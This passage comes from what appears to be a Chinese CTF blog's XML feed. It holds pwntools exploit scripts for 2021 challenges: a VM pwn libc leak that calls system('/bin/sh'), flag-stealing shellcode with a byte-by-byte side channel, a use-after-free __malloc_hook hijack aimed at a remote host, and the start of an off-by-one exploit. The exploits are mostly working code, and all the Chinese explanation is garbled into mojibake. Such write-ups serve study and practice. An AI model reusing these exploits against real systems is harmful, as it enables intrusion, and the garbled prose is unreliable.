class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#ä¿®æ”¹comment</span><br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>) <br>input_code(<span class="hljs-number">0xE0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) <span class="hljs-comment">#6</span><br>p.recvuntil(<span class="hljs-string">&quot;R1: &quot;</span>)<br>addr1 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;R2: &quot;</span>)<br>addr2 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">4</span>),<span class="hljs-number">16</span>)<br>addr = (addr2&lt;&lt;<span class="hljs-number">32</span>) + addr1 - <span class="hljs-number">0x3c67a0</span><br>log.info(<span class="hljs-string">&quot;libc_base: 0x%x&quot;</span> %addr)<br>p.recvuntil(<span class="hljs-string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ‰€è°“VM pwnï¼Œå°±æ˜¯æ¨¡æ‹Ÿè™šæ‹Ÿæœºçš„åº•å±‚è¿è¡Œæœºåˆ¶ï¼Œå¤§é€»è¾‘ä¸Šæ‹¥æœ‰å†…å­˜ã€å¯„å­˜å™¨ï¼Œå†…å­˜ç»†åˆ†è¿˜æœ‰å †æ ˆç­‰ç­‰ï¼Œä»¥åŠè‡ªå·±çš„ä¸€å¥—æŒ‡ä»¤é›†ï¼Œæ‰€ä»¥å¦‚æœå°±ç®—ç¢°åˆ°ä¸æ˜¯ä¸Šé¢çš„ç»™äº†ç¬¦å·è¡¨çš„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªå¤§é€»è¾‘è‡ªå·±è¿›è¡Œç†è§£æ€§çš„è¿˜åŸä»£ç ï¼Œä½¿å¾—ä»£ç æ›´å¥½é˜…è¯»ã€‚è¿™ç±»å‹çš„pwné¢˜éš¾ç‚¹æ›´å¤šå°±æ˜¯åœ¨äºä»£ç é€»è¾‘çš„ç†è§£ï¼ŒçŸ¥é“æŒ‡ä»¤é›†çš„æ“ä½œï¼Œå†æ‰¾å¯»é‡Œé¢å‡ºç°çš„æ¼æ´ï¼Œè¦å…·å¤‡åè¶³çš„è€å¿ƒï¼Œæ¯•ç«Ÿç°åœ¨2021çš„é¢˜ç›®è‚¯å®šæ¯”ä¸Šé¢å¤æ‚å¾ˆå¤šå¾ˆå¤šã€‚</p><p>ç„¶åå‘¢åœ¨åˆ†æè™šæ‹Ÿæœºå®ç°äº†å“ªäº›æŒ‡ä»¤æ—¶ï¼Œå¯ä»¥ä»ä¸‹é¢ä¸¤ä¸ªå¤§æ–¹å‘å…¥æ‰‹ï¼šé¦–å…ˆæ‰¾åˆ°è™šæ‹Ÿå®ç°çš„å†…å­˜ä»¥åŠå¯„å­˜å™¨ï¼Œæ¯”å¦‚ç¨‹åºå¯èƒ½å•ç‹¬mallocå‡ å—å†…å­˜ç”¨æ¥å½“ä½œå¯„å­˜å™¨æˆ–è€…æ ˆç©ºé—´ï¼Œäº¦æˆ–è€…å°±ç”¨å…¨å±€å˜é‡æ¥å®ç°ï¼›ç¬¬äºŒæ­¥å°±æ˜¯è¯»ä»£ç é€»è¾‘ï¼Œåˆ†ææŒ‡ä»¤ã€‚æœ‰å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥æ ¹æ®æç¤ºçš„å­—ç¬¦ä¸²è¯†åˆ«ï¼›æ²¡æœ‰å­—ç¬¦ä¸²ï¼Œåˆ™æ ¹æ®æŒ‡ä»¤<code>æ“ä½œç </code>å’Œ<code>æ“ä½œæ•°</code>æ„æˆï¼Œæ“ä½œæ•°çš„ä¸ªæ•°è¿˜å¯åˆ†ä¸ºä¸€æ“ä½œæ•°æŒ‡ä»¤ã€ä¸¤æ“ä½œæ•°æŒ‡ä»¤ä»¥åŠä¸‰æ“ä½œæ•°æŒ‡ä»¤ç­‰æ¦‚å¿µåŠ å…¥åˆ°ä»£ç é€»è¾‘çš„é˜…è¯»ä¸­ï¼Œå¸®åŠ©æˆ‘ä»¬å¿«é€Ÿåˆ†æå’Œç†è§£ã€‚</p><p>æœ€ååœ¨è°ƒç”¨å¯„å­˜å™¨è¿›è¡Œå¸ƒå±€getshellæ—¶ï¼Œæœ€å¥½æ˜¯è¦æŠŠä»£ç ä¸­çš„æŒ‡ä»¤è¿›è¡Œæ•´åˆï¼Œå°±åƒä¸Šé¢æ•´åˆçš„ä¸€æ ·ï¼Œè¿™æ ·å¯ä»¥åœ¨å†™è„šæœ¬ï¼Œè¿…é€ŸçŸ¥é“æ“ä½œç çš„å–å€¼ä»¥åŠæ“ä½œå¯¹è±¡çš„å€¼</p><p>ç„¶åï¼ŒåŠ æ²¹ï¼</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ç¬¬ä¸€æ¬¡åšVM pwnï¼Œè™½ç„¶å…¨ç¨‹æ˜¯è·Ÿç€è¯¸å¤šå¤§ä½¬åšå®¢èµ°çš„ï¼Œä½†æ€»å¾—è¿˜æ˜¯ä¸ªé‡Œç¨‹ç¢‘ï¼Œåœ¨pwnçš„è·¯ä¸Šèµ°çš„æ›´è¿œäº†ä¸€äº›ã€‚pwnğŸ‘¶ä¹Ÿæƒ³å˜æˆpwnğŸ‘´ï¼Œä¸çŸ¥é“</summary>
      
    
    
    
    
    <category term="VMpwn" scheme="http://example.com/tags/VMpwn/"/>
    
  </entry>
  
  <entry>
    <title>2021è“å¸½æ¯</title>
    <link href="http://example.com/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/"/>
    <id>http://example.com/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/</id>
    <published>2021-10-02T11:11:33.000Z</published>
    <updated>2021-10-13T08:01:25.149Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰è¿˜æ˜¯ä¸ªèœé¸¡ï¼ŒåªæŠŠé¢˜ç›®æ”¶é›†äº†ï¼Œç°åœ¨ã€‚ã€‚ã€‚è¿˜æ˜¯èœé¸¡ï¼Œä½†æ„Ÿè§‰é¸¡è…¿ğŸ–å¯èƒ½å¤§äº†ç‚¹ï¼Œæ¥å¤ç°ä¸€ä¸‹è“å¸½æ¯çš„é¢˜ç›®ï¼ŒæŒç»­æ›´æ–°å§ï¼Œç›®å‰åº”è¯¥èƒ½æ›´æ–°åˆ°åŠå†³èµ›ï¼Œä¸ºä»€ä¹ˆæ²¡æœ‰æ€»å†³èµ›ï¼Ÿå› ä¸ºæ²¡æœ‰wpä¹Ÿæ²¡æœ‰é™„ä»¶</p><p>wpï¼š</p><p><a href="https://blog.csdn.net/qq_43678263/article/details/116277524">https://blog.csdn.net/qq_43678263/article/details/116277524</a></p><p><a href="https://www.lintstar.top/2020/12/784edd2e#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9-3">https://www.lintstar.top/2020/12/784edd2e#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9-3</a></p><h2 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h2><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002191216443.png" alt="image-20211002191216443"></p><p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002191600919.png" alt="image-20211002191600919"></p><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002192200578.png" alt="image-20211002192200578"></p><p>ç¨‹åºéå¸¸ç®€å•ï¼Œå°±è¿™ä¹ˆå‡ è¡Œä»£ç ã€‚å¼€äº†æ²™ç®±ï¼Œåªèƒ½ä½¿ç”¨ open å’Œ read </p><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002193705578.png" alt="image-20211002193705578"></p><p>mmapç”³è¯·åˆ°çš„å†…å­˜ä½äº0x10000~0x11000</p><p>å› ä¸ºä¼šè¯»å–æˆ‘ä»¬è¾“å…¥çš„æ•°æ®æ”¾ç½®åˆ°0x10000ä¸Šï¼Œå¹¶ä¸”ä¼šè¿›è¡Œè°ƒç”¨æ‰§è¡Œï¼Œæ‰€ä»¥å°±æ˜¯è¯»å–flagï¼Œä½†æ˜¯å› ä¸ºæ²¡æœ‰writeå‡½æ•°å¯ä»¥æ‰§è¡Œï¼Œé‚£å°±è¿›è¡Œå•ä¸ªå­—èŠ‚çš„å¯¹æ¯”çˆ†ï¼Œå³è¯»å–flagåˆ°ä¸€å—å†…å­˜åŒºåŸŸï¼Œéšåå•å­—èŠ‚çˆ†ç ´ï¼Œåœ¨shellcodeä¸­è®¾ç½®loopå¾ªç¯ï¼Œä¸€æ—¦cmpå‘½ä¸­å°±è®©ç¨‹åºå¡æ­»ï¼Œå¦åˆ™æ‰§è¡Œåé¢çš„exitå› ä¸ºæ²™ç®±ç¦ç”¨ç¨‹åºå´©æºƒé€€å‡ºï¼Œæ ¹æ®ç¨‹åºçš„è¡¨ç°å¯ä»¥åŒºåˆ†æ˜¯å¦å‘½ä¸­ï¼Œæ³¨æ„å› ä¸ºæœåŠ¡å™¨é€šä¿¡ä¸ç¨³å®šï¼Œæ¯æ¬¡è¯»åˆ°ä¸€æ®µflagå°±æ›´æ–°expä¸­çš„flagå­—ç¬¦ä¸²ç»§ç»­å‘åçˆ†ç ´</p><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211003084329468.png" alt="image-20211003084329468"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">dis,char</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Welcome to silent execution-box.\n&quot;</span>)<br>    sc = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            mov r12,0x67616c66</span><br><span class="hljs-string">            push r12</span><br><span class="hljs-string">            mov rdi,rsp</span><br><span class="hljs-string">            xor esi,esi</span><br><span class="hljs-string">            xor edx,edx</span><br><span class="hljs-string">            mov al,2</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov rdi,rax</span><br><span class="hljs-string">            mov rsi,0x10700</span><br><span class="hljs-string">            mov dl,0x40</span><br><span class="hljs-string">            xor rax,rax</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov dl, byte ptr [rsi+&#123;&#125;]</span><br><span class="hljs-string">            mov cl, &#123;&#125;</span><br><span class="hljs-string">            cmp cl,dl</span><br><span class="hljs-string">            jz loop</span><br><span class="hljs-string">            mov al,60</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            loop:</span><br><span class="hljs-string">            jmp loop</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(dis,char))<br>    p.send(sc)<br>flag = <span class="hljs-string">&quot;flag&#123;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">35</span>):<br>    sleep(<span class="hljs-number">1</span>)<br>    log.success(<span class="hljs-string">&quot;flag : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>,<span class="hljs-number">0x80</span>):<br>        p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            exp(i,j)<br>            p.recvline(timeout=<span class="hljs-number">1</span>)<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            p.send(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            log.success(<span class="hljs-string">&quot;&#123;&#125; pos : &#123;&#125; success&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">chr</span>(j)))<br>            p.close()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:           <br>            p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ä¹‹å‰è¿˜æ˜¯ä¸ªèœé¸¡ï¼ŒåªæŠŠé¢˜ç›®æ”¶é›†äº†ï¼Œç°åœ¨ã€‚ã€‚ã€‚è¿˜æ˜¯èœé¸¡ï¼Œä½†æ„Ÿè§‰é¸¡è…¿ğŸ–å¯èƒ½å¤§äº†ç‚¹ï¼Œæ¥å¤ç°ä¸€ä¸‹è“å¸½æ¯çš„é¢˜ç›®ï¼ŒæŒç»­æ›´æ–°å§ï¼Œç›®å‰åº”è¯¥èƒ½æ›´æ–°åˆ°åŠå†³èµ›ï¼Œä¸º</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2021ç»¿åŸæ¯</title>
    <link href="http://example.com/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/</id>
    <published>2021-10-01T00:54:57.000Z</published>
    <updated>2021-10-13T08:01:25.087Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡PWNé¢˜å¯¹æˆ‘è¿™ç§pwnğŸ‘¶å¯ç®—æ˜¯å‹å¥½è‡³æé˜¿ï¼Œæ„Ÿå—ä¸€ä¸‹å¤§ä½¬åœ¨æ¯”èµ›ä¸­çš„æ€ç©¿çš„å¿«æ„Ÿï¼ä¸è¿‡è¿˜æ˜¯ä¸è¦è¢«è¿™äº›å‡è±¡è¿·äº†çœ¼ï¼Œå…¶å®è¿˜æ˜¯ä¸ªè¹’è·šå­¦æ­¥çš„pwnğŸ‘¶ï¼Œç»§ç»­åŠ æ²¹ï¼</p><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20211001115859860.png" alt="image-20211001115859860"></p><h2 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173017054.png" alt="image-20210929173017054"></p><p>å¦‚é¢˜åå­—ï¼Œå­˜åœ¨UAFï¼Œå€Ÿç€UAFæ³„éœ²libcåœ°å€ï¼Œç„¶åç›´æ¥ä¿®æ”¹é‡Šæ”¾fastchunkçš„fdæŒ‡é’ˆæŒ‡å‘malloc_hookï¼ŒåŠ«æŒä¸ºone_gadgetå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173224666.png" alt="image-20210929173224666"></p><p>åœ¨ç”³è¯·åŠŸèƒ½é‡Œé¢çš„è¾“å…¥ç‚¹å­˜åœ¨å¾ˆæ˜æ˜¾çš„offbyoneï¼Œé€šè¿‡offbyoneåˆ¶é€ overlapï¼Œå¯ä»¥æ³„éœ²å‡ºlibcï¼Œç„¶åä¿®æ”¹è¢«é‡å çš„fastchunkçš„fdæŒ‡é’ˆæŒ‡å‘malloc_hookï¼ŒåŠ«æŒä¸ºone_gadgetå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span 